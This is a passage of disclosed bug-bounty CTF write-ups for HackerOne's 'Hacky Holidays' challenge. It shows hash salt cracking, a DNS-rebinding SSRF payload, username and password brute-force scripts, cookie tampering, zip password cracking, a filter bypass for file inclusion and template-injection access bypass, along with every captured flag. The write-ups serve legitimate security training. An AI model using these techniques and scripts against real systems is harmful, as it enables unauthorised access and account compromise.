3) After fuzzing and trying for hours, we decide to attempt to crack the hash. Since its not in any public database, it most likely uses a salt.
Due to the nature of the challenge, most parts of it use passwords/content related to santa, grinch etc.
We therefore decide to filter out such keyword from the rockyou.txt password list and attempt to see if we can get a valid hash.
What we did is

**Wordlist Generation based on Keywords**
```bash
cat /usr/share/wordlists.rockyou.txt | grep $keyword > keyword-salts.txt
```
**Creation of Crackable Hash**
```bash
for i in $(cat keyword-salts.txt); do echo "5aa9b5a497e3918c0e1900b2a2228c38:$i >>saltedhashes.txt
```
**Cracking with Hashcat**
```bash
hashcat -m 20 saltedhashses.txt pass
```

**Additional Information for Cracking Process**
- Content of pass is the IP from above `203.0.113.213`
- Instead of mode 20 for hashcat we tried mode 10 also, since we can not be sure about the method the salting happened.
- Method 20 in hashcat worked at the end and it is md5($salt.$pass)
- The $keyword to grab content from rockyou.txt wordlist that worked was **grinch**
- The final salt discovered was **mrgrinch463**

4) We can now attempt to forge a valid hash for a target of our choosing. 
```
Target: 127.0.0.1
Salted Hash: 3e3f8df1658372edf0214e202acb460b
New Payload: {"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}
Attack URL:
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
```

But once we submit that, we get the following

{F1128273}

5) We keep trying different representations of the 127.0.0.1 such as localhost, 127.1, hex and decimal representation of IP etc. But either they are blocked, or not valid IPs.
While providing hostnames we see that it also does a DNS lookup for the IP, so there might be a DNS related attack.
We move on attempting to go with DNS rebinding.
The following resource can be used [rebinder](https://lock.cmpxchg8b.com/rebinder.html) to craft a domain that will resolve to the selected IPs.
We can put in one spot a random IP and in the second 127.0.0.1 as below

{F1128398}

We now produce the MD5 of the hostname, we can use this web app [MD5 computation](http://md5.my-addr.com/md5_salted_hash-md5_salt_hash_generator_tool.php) to craft a salted MD5 value

6) We can now submit a new attack with the crafted payload.

**Final Payload**
```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS4xNDE0MTQxNC5yYm5kci51cyIsImhhc2giOiIxZmEyZjM0NjA2YjlkMjFhNzNjZDYyNDI1OTVhOGNlZSJ9
```

We might need to submit this a couple of times to resolve to the desired local address. But once that happens we notice

{F1128403}

7) Once attack is complete we can see the win message page and grab the final flag.
`flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}`

{F1128405}


##**Message to the Grinch**

{F1128426}

##**Message to Everyone Else**

Thanks for this CTF. Merry Christmas to you all and a Happy New Year!! Keep Safe.

##**FLAGS**
Here is a small Christmas Gift
```
flag1 = flag{48104912-28b0-494a-9995-a203d1e261e7}
flag2 = flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
flag3 = flag{b705fb11-fb55-442f-847f-0931be82ed9a}
flag4 = flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
flag5 = flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
flag6 = flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
flag7 = flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
flag8 = flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
flag9 = flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
flag10=flag{99309f0f-1752-44a5-af1e-a03e4150757d}
flag11=flag{07a03135-9778-4dee-a83c-7ec330728e72}
flag12=flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
```

## Impact

We can share cookies with Santa! :)

---

### [Successfully took down the Grinch and saved the holidays from being ruined](https://hackerone.com/reports/1067530)

- **Report ID:** `1067530`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @shubhamz007
- **Bounty:** - usd
- **Disclosed:** 2021-01-12T17:56:21.520Z
- **CVE(s):** -

**Vulnerability Information:**

Beginning
----------
HackerOne's official twitter account posted a tweet on 11th December announcing 12 days of hacky holidays where we have to take down the grinch and prevent him from ruining the Christmas holidays.
{F1132156}


Challenge 1:  Something to get started
--------------------------------------
 I visited [https://hackerone.com/h1-ctf][1] to understand the scope of the target.
[1]: https://hackerone.com/h1-ctf         "https://hackerone.com/h1-ctf"
The main target is `hackyholidays.h1ctf.com`.  When I visited the website I was presented a page with just an image and a video of snow.
As I do not what kind of web programming language is being used (like php, asp, python or any), I started by finding common files in web, for this I used gobuster and wordlist from Seclists.
```
┌─[shubham@parrot]─[~]
└──╼ $gobuster dir -u https://hackyholidays.h1ctf.com/ -w /opt/SecLists/Discovery/Web-Content/raft-small-files.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://hackyholidays.h1ctf.com/
[+] Threads:        10
[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-files.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/12 09:50:10  Starting gobuster
===============================================================
/favicon.ico (Status: 200)
/robots.txt (Status: 200)
===============================================================
2020/12/12 09:56:36  Finished
===============================================================
┌─[shubham@parrot]─[~]
└──╼ $
```
I found 2 files,  favicon.ico and robots.txt. favicon.ico is favicon that it is a file containing small icon associated with particular website. Next is robots.txt, It is a file used to instruct web robots (search engines like google) how to crawl web pages on website. So, this file may contain some information. So, I browsed [https://hackyholidays.h1ctf.com/robots.txt][2]
[2]: https://hackyholidays.h1ctf.com/robots.txt       "https://hackyholidays.h1ctf.com/robots.txt"
```
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```
And I got the flag.

Challenge 2: Dig deeper
-----------------------
In previous challenge there was a disallowed entry in robots.txt file, so on browsing  [https://hackyholidays.h1ctf.com/s3cr3t-ar3a][3] I get the following the contents.
[3]: https://hackyholidays.h1ctf.com/s3cr3t-ar3a "https://hackyholidays.h1ctf.com/s3cr3t-ar3a"
{F1132259}
So, I started by looking at Elements of the page (Ctrl+Shift+I to open developer tools) and I found that class containing that message has a data-info attribute containing the flag.
```
<div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">
        <p>I've moved this page to keep people out!</p>
        <p>If you're allowed access you'll know where to look for the proper page!</p>
</div>
```

Challenge 3: People Rater
-------------------------
Description: The grinch likes to keep lists of all the people he hates. This year he's gone digital but there might be a record that doesn't belong!
On browsing [https://hackyholidays.h1ctf.com/people-rater][4] I got bunch of names of people, upon clicking any I got a popup saying “Aweful“, so I started looking at source code of page and found that the sends an request to `/people-rater/entry?id=` with our supplied id.
[4]:https://hackyholidays.h1ctf.com/people-rater       "https://hackyholidays.h1ctf.com/people-rater"
```
$('.thelist').on("click", "a", function(){
        $.getJSON('/people-rater/entry?id=' + $(this).attr('data-id'), function(resp){
            alert( resp.rating );
        }).fail(function(){
            alert('Request failed');
        });
    });
```
So, I started intercepting the requests with burp suite, upon clicking first name I got this request `GET /people-rater/entry?id=eyJpZCI6Mn0=`. That seems a base64 encoding so I went to decoder section of burp suite and decoded it as base64, I got a value as `{"id":2}` , as it is starting with 2 I must check the result of `{"id":1}` so I base64 encoded it `eyJpZCI6MX0=` and sent it with id parameter in request as this parameter is controlled by us.
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 15 Dec 2020 05:18:04 GMT
Content-Type: application/json
Connection: close
Content-Length: 135
 
{
 "id":"eyJpZCI6MX0=",
 "name":"The Grinch",
"rating":"Amazing in every possible way!",
 "flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"
}
```
And got the flag.

Challenge 4: Swag Shop
-----------------------
Description: Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop.
I browsed [https://hackyholidays.h1ctf.com/swag-shop][5] and there were some items with purchase button, upon clicking purchase I got a login prompt so I started intercepting requests and see where my requests were being sent. Upon intercepting first request I got `/swag-shop/api/purchase` with an id and second login request was being sent to `/swag-shop/api/login` with username and password. As i saw there is an api in play so I started finding all endpoints using gobuster and wordlist from Seclists.
[5]: https://hackyholidays.h1ctf.com/swag-shop     "https://hackyholidays.h1ctf.com/swag-shop"
```
┌─[shubham@parrot]─[~]
└──╼ $gobuster dir -u https://hackyholidays.h1ctf.com/swag-shop/api/ -w /opt/SecLists/Discovery/Web-Content/api/objects.txt --statuscodesblacklist 404
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:                     https://hackyholidays.h1ctf.com/swag-shop/api/
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/api/objects.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.0.1
[+] Timeout:                 10s
===============================================================
2020/12/16 11:05:39  Starting gobuster
===============================================================
/sessions (Status: 200)
/user (Status: 400)
===============================================================
2020/12/16 11:07:34  Finished
===============================================================
┌─[shubham@parrot]─[~]
└──╼ $
```
I used `–statuscodesblacklist` option because by default gobuster uses some predefined codes as filter and as I was finding api can give different response like in this case status 400 which is being filtered in gobuster by default.
Here, I got 2 new endpoints sessions and user, I browsed [https://hackyholidays.h1ctf.com/swag-shop/api/sessions][6]  and I got aresponse with bunch of sessions.
[6]: https://hackyholidays.h1ctf.com/swag-shop/api/sessions             "https://hackyholidays.h1ctf.com/swag-shop/api/sessions"
```
{"sessions":
[
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=",
"eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="
]}
```
I got base64 encoded sessions, so I have decoded and got user
```"{"user":null,"cookie":"YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU="}",
"{"user":null,"cookie":"ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ="}",
"{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}",
"{"user":null,"cookie":"MDRmYTBhN2FiNjY5MGFlOWFmYTE4ZjE2N2JjZmYzZWJkOTRlOGYwMjI1OGIyNjM1ODU0Njc2YTdlZTM4MzFiM2I1MTUzMzViMjFhYzVkMTc4ODE3OGM4Y2JlOTk4MjJlMDI2YjQzZDQxMGNmNTg1ODQxZjBmODBmZWQxZmE1YmE="}",
"{"user":null,"cookie":"M2Q2MDIzNDg5MWE0N2M3NDJmNTIyNGM3NWUxYWQ0NDRlZWI3MTg4MjI3ZGRkMTllZTM2ZDkxMGVlNWEwNmZiZWFkZjZhODg4MDY3ODlmZGRhYTM1Y2IyMGVhMjA1NjdiNDFjYzBhMWQ4NDU1MDc4NDE1YmI5YTJjODBkMjFmN2Y="}",
"{"user":null,"cookie":"MWY3MTAzMTBjZGY4ZGMwYjI3Zjk2ZmYzMWJlMWEyZTg1YzE0MmZlZjMwYmJjZmQ4ZTU0Y2YxYzVmZTM1N2Q1ODY2YjFkZmFiNmI5ZjI1M2M2MDViNjA0ZjFjNDVkNTQ4N2U2ODdiNTJlMmFiMTExODA4MjU2MzkxZWNhNjFkNmU="}",
"{"user":null,"cookie":"MDM4YzhiN2Q3MmY0YjU2M2FkZmFlNDMwMTI5MjEyODhlNGFkMmI5OTcyMDlkNTJhZTc4YjUxZjIzN2Q4NmRjNjg2NmU1MzVlOWEzOTE5NWYyOTcwNmJlZDIyNDgyMTA5ZDA1OTliMTYyNDczNjFkZmU0MTgxYWEwMDU1ZWNhNzQ="}",
"{"user":null,"cookie":"OGI3N2ExOGVjNzM1ZWVmNTk2ZjNkZjIwM2ZjYzdjMWNhODg4NDhhODRmNjI0NDRjZTdlZTg0ZTUwNzZmZDdkYTJjN2IyODY5YjcxZmI5ZGRiYTgzZjhiZDViOWZjMTVlZDgzMTBkNzNmODI0OTM5ZDM3Y2JjZmY4NzEyOGE3NTM="}"
```
I also had an  endpoint as `/api/user` so I browsed that ( `/swag-shop/api/user` ) and got an error saying `{"error":"Missing required fields"}`
I was missing some parameter like `/swag-shop/api/user?parameter=value`, using wfuzz to find parameters.
```
┌─[shubham@parrot]─[~]
└──╼ $wfuzz -u https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=value -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt --hw 3
********************************************************
* Wfuzz 3.0.1 - The Web Fuzzer                         *
********************************************************
Target: https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=value
Total requests: 2588
===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                              
===================================================================
000001359:   404        0 L      5 W      40 Ch       "uuid"                                                                               
Total time: 0
Processed Requests: 2588
Filtered Requests: 2587
Requests/sec.: 0
┌─[shubham@parrot]─[~]
└──╼ $
```
`--hw 3` to filter out results containing above errors. I found an valid parameter `uuid` and recently got a valid username. Using that and browsing [/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043][7] and got the flag and details of grinch.
[7]: https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043    "/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043"
```
{
 "uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
"username":"grinch",
"address":{
     "line_1":"The Grinch",
     "line_2":"The Cave",
     "line_3":"Mount Crumpit",
     "line_4":"Whoville"
     },
"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
}
```

Challenge 5: Secure Login
-------------------------
Description: Try and find a way past the login page to get to the secret area.
I got a login page on browsing [https://hackyholidays.h1ctf.com/secure-login][8], I tried to enter some default credentials like admin and password but got an error saying “Invalid Username”, here webpage was telling me which username is valid and which is invalid, so I can enumerate valid usernames by brute forcing. I have written a python script to do it (We can use tools like hydra but I like writing code for it).
[8]: https://hackyholidays.h1ctf.com/secure-login          "https://hackyholidays.h1ctf.com/secure-login"
```javascript
import requests
	 
url = "https://hackyholidays.h1ctf.com/secure-login"
users = open("/opt/SecLists/Usernames/Names/names.txt","r")
header= { "Content-Type": "application/x-www-form-urlencoded" }
	 
for line in users:
    user = line.rstrip()
    data = f"username={user}&password=admin"
    print(f"Trying : {user}       ",end='\r', flush=True)
    r = requests.post(url, data=data, headers=header)
    if "Invalid Username" not in r.text:
        print(f“Found Username : {user}”)
        break
```
Description about code: I am importing a requests module and defining variable for url, creating an object of file with list of usernames in read mode and defining `Content-Type` header, going through each line in wordlist, stripping newline and spaces from line and defining what data to send (changing username with each iteration and keeping random password) and I send a POST request to given url. If I find string other than `Invalid Username` in response indicates a valid username, so I print the username and break (I can also find other usernames if I do not break here).
Got a valid username as `access` and when giving some random password got an error `Invalid Password` so repeat same steps for password, using `rockyou.txt` as wordlist for password and got password as `computer`.
Using `access` and `computer` to login and got a page saying `No Files To Download` and also there was a new cookie with key securelogin which is base64 encoded.
`eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=`
I base64 decoded it and got `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}`, admin value is false which is set by webpage, changed it to true, base64 encoded again and replaced the cookie and got following page.
{F1132317}
Downloaded the file and found that it was password protected so I used john the ripper tool to crack the password.
```
┌─[✗]─[shubham@parrot]─[~/hackyholidays/securelogin]
└──╼ $zip2john my_secure_files_not_for_you.zip > hash
ver 2.0 efh 5455 efh 7875 my_secure_files_not_for_you.zip/xxx.png PKZIP Encr: 2b chk, TS_chk, cmplen=215105, decmplen=215058, crc=277DEE70
ver 1.0 efh 5455 efh 7875 my_secure_files_not_for_you.zip/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=55, decmplen=43, crc=9DE7C581
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
┌─[shubham@parrot]─[~/hackyholidays/securelogin]
└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hahahaha         (my_secure_files_not_for_you.zip)
1g 0:00:00:00 DONE (2020-12-18 12:41) 33.33g/s 546133p/s 546133c/s 546133C/s total90..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
First, I extracted the hash from compressed file using zip2john, then I used john with rockyou.txt wordlist to crack the hash. 
```
┌─[shubham@parrot]─[~/hackyholidays/securelogin]
└──╼ $unzip my_secure_files_not_for_you.zip 
Archive:  my_secure_files_not_for_you.zip
[my_secure_files_not_for_you.zip] xxx.png password: 
  inflating: xxx.png                 
 extracting: flag.txt                
┌─[shubham@parrot]─[~/hackyholidays/securelogin]
└──╼ $cat flag.txt 
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
┌─[shubham@parrot]─[~/hackyholidays/securelogin]
└──╼ $
```
And got the flag.

Challenge 6: My Diary
----------------------
Description: Hackers! It looks like the Grinch has released his Diary on Grinch Networks. We know he has an upcoming event but he hasn't posted it on his calendar. Can you hack his diary and find out what it is?
First thing to notice browsing [https://hackyholidays.h1ctf.com/my-diary/][8], the url gets replaces to `/my-diary/?template=entries.html`. This indicates it is including the file “entries.html” in response. I started finding files present on webserver.
[8]: https://hackyholidays.h1ctf.com/my-diary/         "https://hackyholidays.h1ctf.com/my-diary/"
```
┌─[shubham@parrot]─[~/hackyholidays/mydiary]
└──╼ $gobuster dir -u https://hackyholidays.h1ctf.com/my-diary/ -w /opt/SecLists/Discovery/Web-Content/raft-small-files.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://hackyholidays.h1ctf.com/my-diary/
[+] Threads:        10
[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-files.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/17 23:04:35  Starting gobuster
===============================================================
/index.php (Status: 302)
/. (Status: 302)
===============================================================
2020/12/17 23:10:15  Finished
===============================================================
┌─[shubham@parrot]─[~/hackyholidays/mydiary]
└──╼ $
```
This indicates index.php file is present on webserver, on browsing [index.php][9], got a source code of index.php file.
[9]: https://hackyholidays.h1ctf.com/my-diary/?template=index.php       "index.php"
```javascript
<?php
if( isset($_GET["template"])  ){
        $page = $_GET["template"];
         //remove non allowed characters
         $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
         //protect admin.php from being read
         $page = str_replace("admin.php","",$page);
        //I've changed the admin file to secretadmin.php for more security!
        $page = str_replace("secretadmin.php","",$page);
        //check file exists
       if( file_exists($page) ){
              echo file_get_contents($page);
        }else{
             //redirect to home
              header("Location: /my-diary/?template=entries.html");
              exit();
         }
}else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
exit();
```
Description about code:
First it checks if it gets any data on GET parameter `template`, if it gets some data it removes any special character(regular expression used to find any character which is not in a-z, A-Z and 0-9 and replace it with nothing), so we can’t use any special character. 
Next it replaces any occurrences of string `admin.php` in data with nothing.
And then it replaces any occurrences of string `secretadmin.php` in data with nothing.
It then checks if the page exists or not, if exits it shows contents of that page and exits if the page does not exist it redirects to home page and exits.
In order to get contents of `secretadmin.php` we can make use of it’s replace function. The replacement only applies once. To explain this in detail, I am using php interactive mode `php -a` command. Goal is to get `secretadmin.php` at last.
```
┌─[shubham@parrot]─[~/hackyholidays/mydiary]
└──╼ $php -a
Interactive mode enabled

php > echo preg_replace('/([^a-zA-Z0-9.])/','',"secretasecretaadmin.phpdmin.phpdmin.php");
secretasecretaadmin.phpdmin.phpdmin.php
php > echo str_replace("admin.php","","secretasecretaadmin.phpdmin.phpdmin.php");
secretasecretadmin.phpdmin.php
php > echo str_replace("secretadmin.php","","secretasecretadmin.phpdmin.php");
secretadmin.php
php > 
```
I sent `secretasecretaadmin.phpdmin.phpdmin.php` as data, this string does not contain any special character the `preg_replace` does not affect the data.
On first replace it replaces any occurrences `admin.php` with nothing so makes data as `secretasecretadmin.phpdmin.php`.
And finally, when it replaces any occurrences of `secretadmin.php` with nothing, the final result becomes `secretadmin.php`.
On browsing [https://hackyholidays.h1ctf.com/my-diary/?template=secretasecretaadmin.phpdmin.phpdmin.php][10] got the flag.
[10]: https://hackyholidays.h1ctf.com/my-diary/?template=secretasecretaadmin.phpdmin.phpdmin.php    "https://hackyholidays.h1ctf.com/my-diary/?template=secretasecretaadmin.phpdmin.phpdmin.php"
{F1132350}


Challenge 7: Hate Mail Generator
--------------------------------
Description: Sending letters is so slow! Now the grinch sends his hate mail by email campaigns! Try and find the hidden flag!
On browsing [https://hackyholidays.h1ctf.com/hate-mail-generator][11], got the following page.
[11]: https://hackyholidays.h1ctf.com/hate-mail-generator   "https://hackyholidays.h1ctf.com/hate-mail-generator"
{F1132356}
On clicking `Guess What` got the page,
{F1132361}
It seems that it is some kind of template. It is including header and footer template using variable template like `{{template:name of template}}` and also it is including the name using `{{name}}`. Upon clicking browse it just shows header and footer templates and name is replaced by Bob.
When I clicked `create new` and got a page where I can create new template but can't create new a it says `Sorry but you've run out of credits` on clicking `create` but I can use preview option so I started playing with that request.
```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 125
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
	 
preview_markup=Hello {{name}} ....&preview_data={"name":"Alice","email":"alice@test.com"}
```
New parameter `preview_data` with some predefined value. From predefined message from grinch 'template` parameter was used, so I tried including it with some random value and sending request with data `preview_markup={{template:abc}}&preview_data={"name":"Alice","email":"alice@test.com"}` and got response as `Cannot find template file /templates/abc` indicating it is fetching from /templates directory, so I browsed [https://hackyholidays.h1ctf.com/hate-mail-generator/templates/][12] and got some templates.
{F1132391}
I already know the templates from grinch from predefined message so my aim is to get template `38dhs_admins_only_header.html` so I tried including it using request data `preview_markup={{template:38dhs_admins_only_header.html}}&preview_data={"name":"Alice","email":"alice@test.com"}` but got a response `You do not have access to the file 38dhs_admins_only_header.html` so need to bypass the restriction to include that template.
[12]: https://hackyholidays.h1ctf.com/hate-mail-generator/templates/      "https://hackyholidays.h1ctf.com/hate-mail-generator/templates/"
I started tampering with `preview_data` parameter It expects a JSON data with key:value format. In `template_markup` parameter whatever I put `{{something}}` it tries to find it’s value in `preview_data` and replaces it there. For example, if I send request with data `preview_markup=Hi {{newitem}}&preview_data={"name":"Alice","newitem":"craeteditem"}` got response as `Hi craeteditem`. As I directly did not have access to admin template, I defined it in `preview_data` and so when application replaces the key by its respective value, application finds template variable and loads the template for me, so I sent the request like `preview_markup={{givetemplate}}&preview_data={"name":"Alice","givetemplate":"{{template:38dhs_admins_only_header.html}}"}`.
First the `{{givetemplate}}` is replaced by `{{template:38dhs_admins_only_header.html}}` and again when the application finds the defined template it processes it and loaded the template for me and I got the flag.
{F1132400}


Challenge 8: Forum
--------------------
Description: The Grinch thought it might be a good idea to start a forum but nobody really wants to chat to him. He keeps his best posts in the Admin section but you'll need a valid login to access that!
I visited [https://hackyholidays.h1ctf.com/forum][13] and got the following page.
{F1132407}
Inside Chirstmas!!! There was 1 post with 2 comments but nothing special. So I did a directory search and got the results as,
```
┌─[shubham@parrot]─[~/hackyholidays/forum]
└──╼ $gobuster dir -u https://hackyholidays.h1ctf.com/forum -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://hackyholidays.h1ctf.com/forum
[+] Threads:        50
[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/22 09:38:43 Starting gobuster
===============================================================
/login (Status: 200)
/1 (Status: 200)
/2 (Status: 200)
/phpmyadmin (Status: 200)
===============================================================
2020/12/22 09:43:05 Finished
===============================================================
